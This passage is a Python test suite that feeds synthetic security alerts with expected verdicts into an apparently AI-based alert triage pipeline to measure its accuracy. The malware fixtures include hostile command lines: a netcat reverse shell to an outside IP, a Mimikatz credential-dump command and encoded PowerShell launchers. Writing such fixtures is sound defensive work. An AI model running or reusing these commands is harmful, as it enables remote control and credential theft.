#!/usr/bin/env python3
# Copyright (c) 2024-2026 T1 Agentics LLC
# SPDX-License-Identifier: Apache-2.0

"""
T1 Agentics Pipeline QA Test Suite

Comprehensive test of the alert processing pipeline with 50+ alerts
covering multiple categories. Measures accuracy, latency, and false positive rates.

Categories tested:
- Phishing (benign + malicious + forwarded)
- Malware (EDR true positives + noisy detections)
- Credential abuse
- Network anomalies
- Legitimate admin activity

Usage:
    python qa_pipeline_test.py [--reset] [--wait-minutes N]
"""

import asyncio
import json
import time
import httpx
import asyncpg
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import hashlib
import sys

# Configuration
# When running inside docker container, use service names
# When running outside, use localhost
import os
BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:8000")
WEBHOOK_NAME = "test"  # Use the test webhook (no token required)
DB_URL = os.getenv("DB_URL", "postgresql://agentcore:agentcore_dev_password@postgres:5432/agentcore")
PROCESSING_WAIT_SECONDS = 180  # Wait for T1 processing
POLL_INTERVAL_SECONDS = 5


class GroundTruth(Enum):
    """Expected disposition for test alerts"""
    TRUE_POSITIVE = "true_positive"       # Actually malicious, should be flagged
    TRUE_NEGATIVE = "true_negative"       # Actually benign, should NOT be flagged
    FALSE_POSITIVE_RISK = "fp_risk"       # Likely to cause false positive
    SUSPICIOUS_LEGIT = "suspicious_legit" # Suspicious-looking but legitimate


@dataclass
class TestAlert:
    """Test alert with ground truth"""
    title: str
    description: str
    category: str
    severity: str
    ground_truth: GroundTruth
    raw_event: Dict[str, Any]
    expected_verdict: str  # "MALICIOUS", "SUSPICIOUS", "BENIGN"
    notes: str = ""
    test_id: str = ""

    def __post_init__(self):
        if not self.test_id:
            # Generate unique test ID
            content = f"{self.title}:{self.category}:{time.time()}"
            self.test_id = f"QA-{hashlib.md5(content.encode()).hexdigest()[:8].upper()}"


@dataclass
class TestResult:
    """Result of processing a test alert"""
    test_alert: TestAlert
    alert_id: str
    ai_verdict: Optional[str] = None
    ai_confidence: Optional[float] = None
    ai_reasoning: Optional[str] = None
    triage_status: Optional[str] = None
    triage_blocked_reason: Optional[str] = None
    enrichment_status: Optional[str] = None
    enrichment_summary: Optional[Dict] = None
    processing_time_ms: Optional[float] = None
    is_correct: Optional[bool] = None
    classification: Optional[str] = None  # TP, TN, FP, FN
    is_soft_positive: bool = False  # True if verdict was NEEDS_INVESTIGATION


@dataclass
class TestMetrics:
    """Aggregated test metrics"""
    total_alerts: int = 0
    processed_alerts: int = 0
    blocked_alerts: int = 0

    # Confusion matrix
    true_positives: int = 0
    true_negatives: int = 0
    false_positives: int = 0
    false_negatives: int = 0

    # Soft positives (NEEDS_INVESTIGATION verdicts)
    soft_positives: int = 0  # TP via NEEDS_INVESTIGATION (flagged for review)
    definitive_positives: int = 0  # TP via MALICIOUS/SUSPICIOUS (confident verdict)

    # By category
    by_category: Dict[str, Dict[str, int]] = field(default_factory=dict)

    # Latency
    avg_latency_ms: float = 0.0
    p50_latency_ms: float = 0.0
    p95_latency_ms: float = 0.0
    p99_latency_ms: float = 0.0

    # False positive analysis
    fp_root_causes: List[Dict[str, Any]] = field(default_factory=list)


# ============================================================================
# TEST ALERT DEFINITIONS - 50+ alerts across categories
# ============================================================================

def get_test_alerts() -> List[TestAlert]:
    """Generate comprehensive test alert dataset"""
    alerts = []

    # ---------- PHISHING - MALICIOUS (10 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Microsoft 365 Password Reset - Suspicious Link",
            description="User clicked link in email claiming M365 password expires",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "ACTION REQUIRED: Your Microsoft 365 password expires today",
                    "from": "security-noreply@micros0ft-alerts.com",
                    "to": "employee@company.com",
                    "body": "Click here to reset your password before it expires: https://login-microsoft365.malware-domain.com/reset",
                    "headers": {
                        "SPF": "fail",
                        "DKIM": "none",
                        "DMARC": "fail",
                        "X-Originating-IP": "185.220.101.45"
                    }
                },
                "urls": ["https://login-microsoft365.malware-domain.com/reset"],
                "sender_domain": "micros0ft-alerts.com"
            },
            notes="Classic credential harvesting - typosquatted domain, failed auth checks"
        ),
        TestAlert(
            title="DocuSign Document Sharing - Credential Phish",
            description="Fake DocuSign sharing notification with malicious link",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "Document shared: Q4 Financial Report.pdf",
                    "from": "docusign-noreply@secure-signing.net",
                    "to": "finance@company.com",
                    "body": "View document: https://docusign-view.phishsite.ru/doc/12345",
                    "headers": {
                        "SPF": "softfail",
                        "Return-Path": "bounce@phishsite.ru"
                    }
                },
                "domains": ["docusign-view.phishsite.ru", "secure-signing.net"],
                "attachment_analysis": {"has_macro": False}
            },
            notes="Brand impersonation + suspicious .ru TLD"
        ),
        TestAlert(
            title="Office 365 Voicemail Phishing",
            description="Fake voicemail notification leading to credential harvest",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "You have a new voicemail from +1-555-123-4567",
                    "from": "voicemail@office365-vm.info",
                    "to": "user@company.com",
                    "html_body": "<a href='https://office365-voicemail.malsite.com/listen'>Listen Now</a>",
                    "headers": {
                        "SPF": "neutral",
                        "X-Mailer": "PHPMailer 5.2"
                    }
                },
                "urls": ["https://office365-voicemail.malsite.com/listen"],
                "iocs": {"domains": ["office365-vm.info", "malsite.com"]}
            },
            notes="Voicemail lure is common social engineering"
        ),
        TestAlert(
            title="CEO Wire Transfer Request",
            description="BEC attempt impersonating CEO requesting urgent wire transfer",
            category="phishing",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "Urgent: Wire Transfer Needed",
                    "from": "john.smith.ceo@gmail.com",
                    "reply_to": "john.smith.ceo@gmail.com",
                    "to": "accounts-payable@company.com",
                    "body": "I need you to process an urgent wire transfer of $45,000 to our new vendor. This is time-sensitive. Please confirm receipt.",
                    "headers": {
                        "SPF": "pass",  # Gmail SPF passes
                        "DKIM": "pass"
                    }
                },
                "analysis": {
                    "ceo_impersonation": True,
                    "urgency_indicators": ["urgent", "time-sensitive"],
                    "financial_request": True
                }
            },
            notes="BEC attack - CEO name but personal email domain"
        ),
        TestAlert(
            title="Payroll Update Request Phishing",
            description="HR impersonation requesting direct deposit changes",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "Required: Update Your Direct Deposit Information",
                    "from": "hr-benefits@company-hr-portal.net",
                    "to": "all-employees@company.com",
                    "body": "Due to a system upgrade, please verify your direct deposit at: https://hr-portal-update.phishkit.xyz/verify",
                    "headers": {"SPF": "fail", "DMARC": "reject"}
                },
                "urls": ["https://hr-portal-update.phishkit.xyz/verify"]
            },
            notes="Payroll redirect scheme"
        ),
        TestAlert(
            title="Sharepoint Document Access - Credential Harvest",
            description="Fake Sharepoint notification with malicious form",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "IT Admin shared 'Employee Handbook 2026.pdf'",
                    "from": "sharepoint@microsoft-sharepointonline.info",
                    "body": "Access document: https://sharepoint-forms.xyz/access?doc=handbook"
                },
                "urls": ["https://sharepoint-forms.xyz/access"],
                "domains": ["microsoft-sharepointonline.info", "sharepoint-forms.xyz"]
            }
        ),
        TestAlert(
            title="LinkedIn InMail Phishing",
            description="Fake LinkedIn message with job opportunity phish",
            category="phishing",
            severity="medium",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "email": {
                    "subject": "You appeared in 15 searches this week",
                    "from": "notifications@linkedin-mail.net",
                    "body": "A recruiter from Google wants to connect. View profile: https://linkedin-view.fakesite.com/profile"
                },
                "urls": ["https://linkedin-view.fakesite.com/profile"]
            }
        ),
        TestAlert(
            title="Zoom Meeting Invite Phishing",
            description="Malicious Zoom invite with credential harvesting link",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "Urgent Meeting: Board Review Tomorrow 9AM",
                    "from": "zoom@zoom-meetings-invite.com",
                    "body": "Join meeting: https://zoom-us.malicious.site/j/123456789"
                },
                "analysis": {"brand_impersonation": "zoom", "urgency": True}
            }
        ),
        TestAlert(
            title="Apple ID Verification Phish",
            description="Fake Apple account verification email",
            category="phishing",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "email": {
                    "subject": "Your Apple ID has been locked",
                    "from": "appleid@apple-security-alert.com",
                    "body": "Verify your identity: https://appleid-verify.malware.ru/confirm",
                    "headers": {"SPF": "fail"}
                },
                "urls": ["https://appleid-verify.malware.ru/confirm"]
            }
        ),
        TestAlert(
            title="Amazon Order Confirmation Phish",
            description="Fake Amazon order with malicious tracking link",
            category="phishing",
            severity="medium",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "email": {
                    "subject": "Your Amazon order #112-5678901-2345678 has shipped",
                    "from": "ship-confirm@amazon-delivery-status.net",
                    "body": "Track your package: https://amazon-track.fakecarrier.info/track"
                }
            }
        ),
    ])

    # ---------- PHISHING - BENIGN (10 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Legitimate Microsoft Password Reset",
            description="Actual Microsoft password reset notification",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Microsoft account security info was added",
                    "from": "account-security-noreply@accountprotection.microsoft.com",
                    "to": "user@company.com",
                    "body": "A new sign-in method was added to your account. If this was you, you can ignore this email.",
                    "headers": {
                        "SPF": "pass",
                        "DKIM": "pass",
                        "DMARC": "pass",
                        "Authentication-Results": "spf=pass dkim=pass dmarc=pass"
                    }
                },
                "urls": ["https://account.microsoft.com/security"]
            },
            notes="Legitimate Microsoft email - all auth passes, correct domain"
        ),
        TestAlert(
            title="Legitimate DocuSign Document",
            description="Real DocuSign document signing request",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Please DocuSign: Contract Agreement.pdf",
                    "from": "dse_na3@docusign.net",
                    "body": "Review and sign: https://na3.docusign.net/Signing/StartInSession.aspx?...",
                    "headers": {
                        "SPF": "pass",
                        "DKIM": "pass",
                        "DMARC": "pass"
                    }
                },
                "urls": ["https://na3.docusign.net/Signing/StartInSession.aspx"]
            },
            notes="Legitimate DocuSign from proper domain"
        ),
        TestAlert(
            title="Internal IT Password Policy Reminder",
            description="Legitimate IT department password reminder",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Reminder: Password expires in 14 days",
                    "from": "it-notifications@company.com",
                    "to": "user@company.com",
                    "body": "Your Active Directory password will expire on 2026-02-08. Please update it via the standard company portal.",
                    "headers": {
                        "SPF": "pass",
                        "DKIM": "pass",
                        "X-MS-Exchange-Organization-AuthSource": "company.com"
                    }
                },
                "urls": ["https://portal.company.com/password"]
            },
            notes="Internal email with correct domain and auth"
        ),
        TestAlert(
            title="Forwarded Suspicious Email for Analysis",
            description="User forwarded suspicious email to security team",
            category="phishing",
            severity="medium",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "FW: Suspicious email - please review",
                    "from": "john.employee@company.com",
                    "to": "security@company.com",
                    "body": "Hi Security team, I received this suspicious email. Can you verify?\n\n---Original Message---\nFrom: support@bank-alerts.ru\nSubject: Your account is suspended",
                    "headers": {
                        "SPF": "pass",
                        "DKIM": "pass",
                        "X-Forwarded-For": "user"
                    }
                },
                "analysis": {"is_forwarded": True, "forwarded_to_security": True}
            },
            notes="Employee correctly reporting phish - should NOT be flagged"
        ),
        TestAlert(
            title="Legitimate Zoom Meeting Invite",
            description="Real Zoom calendar invite from colleague",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Project Sync - Weekly",
                    "from": "jane.manager@company.com",
                    "body": "Join: https://company.zoom.us/j/123456789",
                    "headers": {"SPF": "pass", "DKIM": "pass"}
                },
                "urls": ["https://company.zoom.us/j/123456789"]
            }
        ),
        TestAlert(
            title="Real LinkedIn Notification",
            description="Genuine LinkedIn connection request",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "John Smith wants to connect",
                    "from": "invitations@linkedin.com",
                    "body": "Accept invitation: https://www.linkedin.com/comm/mynetwork/",
                    "headers": {"SPF": "pass", "DKIM": "pass", "DMARC": "pass"}
                },
                "urls": ["https://www.linkedin.com/comm/mynetwork/"]
            }
        ),
        TestAlert(
            title="Vendor Invoice Email",
            description="Legitimate vendor sending invoice",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Invoice #INV-2026-0145 from TechSupplier Inc",
                    "from": "billing@techsupplier.com",
                    "to": "ap@company.com",
                    "body": "Please find attached invoice for January services.",
                    "headers": {"SPF": "pass", "DKIM": "pass"},
                    "attachments": [{"name": "invoice_2026_0145.pdf", "type": "application/pdf"}]
                }
            }
        ),
        TestAlert(
            title="Marketing Newsletter",
            description="Subscribed marketing email",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Your Weekly Tech Digest",
                    "from": "newsletter@techpublisher.com",
                    "list_unsubscribe": "https://techpublisher.com/unsubscribe",
                    "headers": {"SPF": "pass", "DKIM": "pass", "List-Unsubscribe": "<mailto:...>"}
                }
            }
        ),
        TestAlert(
            title="HR Benefits Enrollment Reminder",
            description="Legitimate HR system notification",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Open Enrollment ends January 31st",
                    "from": "benefits@company.com",
                    "body": "Complete your benefits selection at https://benefits.company.com",
                    "headers": {"SPF": "pass", "DKIM": "pass", "X-MS-Exchange-Organization-AuthAs": "Internal"}
                },
                "urls": ["https://benefits.company.com"]
            }
        ),
        TestAlert(
            title="Shipping Notification - Legitimate",
            description="Real FedEx tracking notification",
            category="phishing",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "email": {
                    "subject": "Your FedEx package is on the way",
                    "from": "TrackingUpdates@fedex.com",
                    "body": "Track at: https://www.fedex.com/fedextrack/?trknbr=123456789012",
                    "headers": {"SPF": "pass", "DKIM": "pass", "DMARC": "pass"}
                },
                "urls": ["https://www.fedex.com/fedextrack/"]
            }
        ),
    ])

    # ---------- MALWARE - TRUE POSITIVES (8 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Emotet Dropper Detected",
            description="EDR detected Emotet malware execution",
            category="malware",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "type": "malware",
                    "malware_family": "Emotet",
                    "confidence": 0.98
                },
                "process": {
                    "name": "outlook.exe",
                    "child_process": "powershell.exe",
                    "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC...",
                    "parent_pid": 4532
                },
                "file": {
                    "name": "invoice_doc.doc",
                    "hashes": {
                        "sha256": "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
                    },
                    "has_macro": True
                },
                "network": {
                    "connections": [
                        {"dst_ip": "185.220.101.45", "dst_port": 443},
                        {"dst_ip": "91.121.87.10", "dst_port": 8080}
                    ]
                }
            },
            notes="Classic Emotet - macro doc spawns powershell with encoded command"
        ),
        TestAlert(
            title="Cobalt Strike Beacon Activity",
            description="C2 communication detected matching Cobalt Strike",
            category="malware",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "type": "c2",
                    "framework": "Cobalt Strike",
                    "beacon_type": "HTTPS"
                },
                "process": {
                    "name": "rundll32.exe",
                    "command_line": "rundll32.exe C:\\Users\\Public\\file.dll,Start"
                },
                "network": {
                    "dst_ip": "45.77.65.211",
                    "dst_port": 443,
                    "jitter": "37%",
                    "sleep": "60s"
                },
                "iocs": {
                    "ips": ["45.77.65.211"],
                    "hashes": ["def456789012345678901234567890abcdef456789012345678901234567890ab"]
                }
            },
            notes="Cobalt Strike beacon with characteristic jitter and sleep"
        ),
        TestAlert(
            title="Ransomware Encryption Activity",
            description="Mass file encryption detected - ransomware behavior",
            category="malware",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "type": "ransomware",
                    "behavior": "mass_encryption"
                },
                "file_activity": {
                    "files_modified": 1547,
                    "extensions_added": [".encrypted", ".locked"],
                    "ransom_note": "README_DECRYPT.txt"
                },
                "process": {
                    "name": "unknown.exe",
                    "sha256": "badfile0123456789012345678901234567890123456789012345678901234567"
                }
            }
        ),
        TestAlert(
            title="Mimikatz Credential Dumping",
            description="Credential harvesting tool detected",
            category="malware",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "tool": "Mimikatz",
                    "technique": "credential_dumping"
                },
                "process": {
                    "name": "mimikatz.exe",
                    "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
                },
                "mitre": {
                    "tactic": "Credential Access",
                    "technique": "T1003.001"
                }
            }
        ),
        TestAlert(
            title="PowerShell Empire Agent",
            description="PowerShell-based attack framework detected",
            category="malware",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {"framework": "Empire"},
                "process": {
                    "name": "powershell.exe",
                    "command_line": "powershell -noP -sta -w 1 -enc JABHAHIAbwB..."
                },
                "network": {
                    "dst_ip": "192.99.44.107",
                    "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64)"
                }
            }
        ),
        TestAlert(
            title="Qakbot Loader Execution",
            description="Qakbot/QBot banking trojan detected",
            category="malware",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "malware_family": "Qakbot",
                    "variant": "Obama207"
                },
                "file": {
                    "name": "report.xlsb",
                    "sha256": "qakbot123456789012345678901234567890123456789012345678901234567"
                },
                "process": {
                    "chain": ["excel.exe", "regsvr32.exe", "explorer.exe"]
                }
            }
        ),
        TestAlert(
            title="Reverse Shell Detected",
            description="Netcat reverse shell connection established",
            category="malware",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {"type": "reverse_shell"},
                "process": {
                    "name": "nc.exe",
                    "command_line": "nc.exe -e cmd.exe 45.33.32.156 4444"
                },
                "network": {
                    "dst_ip": "45.33.32.156",
                    "dst_port": 4444,
                    "direction": "outbound"
                }
            }
        ),
        TestAlert(
            title="LSASS Memory Access",
            description="Suspicious LSASS process memory access",
            category="malware",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {
                    "technique": "LSASS memory dump",
                    "mitre": "T1003.001"
                },
                "process": {
                    "name": "rundll32.exe",
                    "target_process": "lsass.exe",
                    "access_mask": "PROCESS_VM_READ"
                }
            }
        ),
    ])

    # ---------- MALWARE - NOISY/BENIGN (6 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Legitimate Admin PowerShell",
            description="IT admin running authorized PowerShell script",
            category="malware",
            severity="medium",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "process": {
                    "name": "powershell.exe",
                    "user": "DOMAIN\\admin.john",
                    "command_line": "powershell.exe -File C:\\Scripts\\Update-ADUsers.ps1",
                    "signed": True,
                    "signer": "Microsoft Windows"
                },
                "context": {
                    "source_host": "ADMIN-WS01",
                    "is_admin_machine": True,
                    "change_ticket": "CHG0012345"
                }
            },
            notes="Legitimate admin activity with change ticket reference"
        ),
        TestAlert(
            title="Software Deployment Tool",
            description="SCCM deploying software - triggers AV",
            category="malware",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {
                    "type": "suspicious_activity",
                    "reason": "Remote execution"
                },
                "process": {
                    "name": "ccmexec.exe",
                    "parent": "svchost.exe",
                    "user": "SYSTEM"
                },
                "context": {
                    "tool": "SCCM",
                    "deployment_id": "DEP-2026-0089"
                }
            },
            notes="SCCM legitimate deployment"
        ),
        TestAlert(
            title="Pentest Tool - Authorized",
            description="Security team running authorized pentest",
            category="malware",
            severity="high",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {
                    "tool": "nmap",
                    "type": "network_scan"
                },
                "process": {
                    "name": "nmap.exe",
                    "user": "DOMAIN\\sec.tester",
                    "command_line": "nmap -sS -p 1-1000 10.0.0.0/24"
                },
                "context": {
                    "pentest_engagement": "PT-2026-Q1",
                    "authorized": True,
                    "scope": "10.0.0.0/24"
                }
            },
            notes="Authorized penetration test"
        ),
        TestAlert(
            title="Developer Debugging Tool",
            description="Developer using debugger on application",
            category="malware",
            severity="medium",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {
                    "type": "process_injection",
                    "reason": "Debugger attached"
                },
                "process": {
                    "name": "devenv.exe",
                    "target": "myapp.exe",
                    "user": "DOMAIN\\dev.jane"
                },
                "context": {
                    "machine_type": "developer_workstation",
                    "application": "internal_app"
                }
            }
        ),
        TestAlert(
            title="Backup Software Activity",
            description="Veeam backup accessing many files",
            category="malware",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {
                    "type": "mass_file_access",
                    "files_accessed": 50000
                },
                "process": {
                    "name": "VeeamAgent.exe",
                    "signed": True,
                    "signer": "Veeam Software Group GmbH"
                },
                "context": {
                    "scheduled_backup": True,
                    "backup_job": "Daily-Full-Backup"
                }
            },
            notes="Legitimate backup software"
        ),
        TestAlert(
            title="Antivirus Scan Process",
            description="Crowdstrike scanning triggers monitoring alert",
            category="malware",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {
                    "type": "process_memory_scan"
                },
                "process": {
                    "name": "CSFalconService.exe",
                    "signed": True,
                    "signer": "CrowdStrike, Inc."
                }
            }
        ),
    ])

    # ---------- CREDENTIAL ABUSE (6 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Brute Force Login Attempt",
            description="Multiple failed logins from single IP",
            category="credential_abuse",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "event_type": "failed_login",
                "count": 150,
                "time_window": "5 minutes",
                "source_ip": "185.220.101.45",
                "target_users": ["admin", "administrator", "root", "sa"],
                "geo": {"country": "RU", "city": "Moscow"}
            }
        ),
        TestAlert(
            title="Password Spray Attack",
            description="Single password tried against many accounts",
            category="credential_abuse",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "event_type": "password_spray",
                "unique_users": 500,
                "password_pattern": "Company2026!",
                "source_ip": "91.121.87.10",
                "success_count": 3
            }
        ),
        TestAlert(
            title="Successful Login After Failed Attempts",
            description="Account accessed after multiple failures",
            category="credential_abuse",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "event_sequence": [
                    {"type": "failed_login", "count": 8},
                    {"type": "successful_login", "source_ip": "45.33.32.156"}
                ],
                "user": "john.doe",
                "source_ip": "45.33.32.156",
                "geo": {"country": "CN"}
            }
        ),
        TestAlert(
            title="Legitimate User Lockout",
            description="User locked out after password change",
            category="credential_abuse",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "event_type": "account_lockout",
                "user": "jane.smith",
                "failed_attempts": 6,
                "source_ips": ["10.0.1.50", "10.0.1.51"],
                "context": {
                    "password_changed": "2 hours ago",
                    "devices": ["laptop", "mobile"]
                }
            },
            notes="Common scenario - user forgets new password"
        ),
        TestAlert(
            title="Service Account Normal Activity",
            description="Service account with expected login pattern",
            category="credential_abuse",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "event_type": "service_account_login",
                "user": "svc_backup",
                "source_ip": "10.0.0.50",
                "logon_type": "service",
                "context": {
                    "expected_source": "10.0.0.50",
                    "expected_time": "02:00-04:00"
                }
            }
        ),
        TestAlert(
            title="Credential Stuffing Attack",
            description="Automated login attempts with breached credentials",
            category="credential_abuse",
            severity="critical",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "event_type": "credential_stuffing",
                "attempts": 10000,
                "unique_usernames": 10000,
                "source_ips": 50,
                "time_window": "1 hour"
            }
        ),
    ])

    # ---------- NETWORK ANOMALIES (6 alerts) ----------
    alerts.extend([
        TestAlert(
            title="DNS Tunneling Detected",
            description="High volume of DNS queries to suspicious domain",
            category="network",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="MALICIOUS",
            raw_event={
                "detection": {"type": "dns_tunneling"},
                "dns": {
                    "query_count": 5000,
                    "time_window": "10 minutes",
                    "domain": "tunnel.malicious-c2.com",
                    "record_types": ["TXT", "NULL"],
                    "avg_query_length": 180
                },
                "source_host": "WORKSTATION-42"
            }
        ),
        TestAlert(
            title="Data Exfiltration Over HTTPS",
            description="Large data transfer to unknown external IP",
            category="network",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "detection": {"type": "data_exfiltration"},
                "network": {
                    "dst_ip": "45.77.65.211",
                    "bytes_sent": 5368709120,  # 5GB
                    "protocol": "HTTPS",
                    "duration_minutes": 45
                },
                "source_host": "FILESERVER-01",
                "user": "john.doe"
            }
        ),
        TestAlert(
            title="Internal Port Scan",
            description="Host scanning internal network",
            category="network",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "detection": {"type": "port_scan"},
                "network": {
                    "source_ip": "10.0.1.105",
                    "ports_scanned": 1000,
                    "targets": 50,
                    "scan_type": "SYN"
                },
                "context": {
                    "normal_behavior": False,
                    "machine_type": "workstation"
                }
            }
        ),
        TestAlert(
            title="Legitimate CDN Traffic",
            description="High traffic to Cloudflare CDN",
            category="network",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "detection": {"type": "high_bandwidth"},
                "network": {
                    "dst_ip": "104.16.132.229",
                    "bytes_transferred": 10737418240,  # 10GB
                    "domain": "cdn.cloudflare.com"
                },
                "context": {
                    "known_cdn": True,
                    "business_justification": "Software update distribution"
                }
            }
        ),
        TestAlert(
            title="VPN Connection from New Location",
            description="User VPN from new geographic location",
            category="network",
            severity="medium",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "event_type": "vpn_login",
                "user": "alice.johnson",
                "source_ip": "89.123.45.67",
                "geo": {"country": "DE", "city": "Berlin"},
                "context": {
                    "travel_approval": "TRV-2026-0045",
                    "expected_location": "Germany"
                }
            },
            notes="User on approved business travel"
        ),
        TestAlert(
            title="TOR Exit Node Connection",
            description="Connection to known TOR exit node",
            category="network",
            severity="high",
            ground_truth=GroundTruth.TRUE_POSITIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "detection": {"type": "tor_traffic"},
                "network": {
                    "dst_ip": "185.220.101.45",
                    "is_tor_exit": True
                },
                "source_host": "WORKSTATION-55"
            }
        ),
    ])

    # ---------- LEGITIMATE ADMIN ACTIVITY (4 alerts) ----------
    alerts.extend([
        TestAlert(
            title="Scheduled Maintenance Script",
            description="IT running scheduled maintenance tasks",
            category="admin_activity",
            severity="medium",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "process": {
                    "name": "pwsh.exe",
                    "command_line": "pwsh.exe -File C:\\Maintenance\\WeeklyCleanup.ps1",
                    "user": "DOMAIN\\svc_maintenance"
                },
                "context": {
                    "scheduled_task": "Weekly-Cleanup",
                    "change_request": "CHG0012567"
                }
            }
        ),
        TestAlert(
            title="Group Policy Update",
            description="Admin pushing GPO changes",
            category="admin_activity",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "event_type": "gpo_change",
                "user": "DOMAIN\\admin.bob",
                "gpo_name": "Security-Baseline-2026",
